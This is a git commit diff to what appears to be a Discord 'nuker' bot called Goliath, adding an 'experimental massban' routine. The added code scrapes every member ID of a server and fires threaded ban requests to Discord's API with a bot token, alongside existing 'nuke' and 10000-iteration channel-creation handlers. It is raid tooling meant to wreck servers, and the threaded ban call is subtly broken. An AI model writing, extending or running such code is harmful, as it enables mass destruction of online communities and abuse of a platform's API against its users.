669f95ec476a8aed1c09136de09a824946584ee5
L4MBD41ST <110331414+l4mbd41st@users.noreply.github.com>
2025-07-12 00:18:54 +0200

    add experimental massban

--- goliath.py
+++ goliath.py
@@ -76,6 +76,40 @@ async def nuke(ctx):
         print(Colorate.Color(Colors.red, f"Error: {e}", True))
 
 @GOLIATH.event
+async def massban(ctx):
+    await ban().scrape()
+
+class ban():
+    def __init__(self):
+        self.token = token
+        self.guild = guild
+
+    async def scrape(self):
+        await client.wait_until_ready()
+        ob = client.get_guild(int(self.guild))
+        members = await ob.chunk()
+        os.remove('Core/botscrape.txt')
+
+        with open('Core/botscrape.txt', 'a') as txt:
+            for member in members:
+                txt.write(str(member.id) + '\n')
+            txt.close()
+            await ban().thread()
+    
+    async def thread(self):
+        print('\n [>] Banning...\n')
+        txt = open('Core/botscrape.txt')
+        for member in txt:
+            threading.Thread(target=ban.mass, args=(self.guild, member,)).start()
+        txt.close()
+
+    def mass(self, member):
+        try:
+            requests.put(f'https://discord.com/api/v{random.choice([6, 7, 8, 9])}/guilds/{guild}/bans/{member}', headers={'Authorization': f'Bot {token}'}), time.sleep(0.1)
+        except:
+            pass
+
+@GOLIATH.event
 async def on_guild_channel_create(channel):
     tasks = []
     for _ in range(10000):
